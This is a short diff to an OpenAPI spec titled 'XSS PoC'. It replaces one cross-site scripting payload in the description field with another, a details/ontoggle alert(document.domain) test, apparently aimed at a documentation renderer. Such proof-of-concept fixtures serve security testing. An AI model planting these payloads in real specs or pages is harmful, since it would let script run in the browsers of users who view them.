@@ -1,6 +1,6 @@
 openapi: 3.0.0
 info:
   title: XSS PoC
-  description: '<img src=x onerror=alert(document.domain)>'
+  description: '<details open ontoggle=alert(document.domain)>'
   version: 1.0.0
 paths: {}
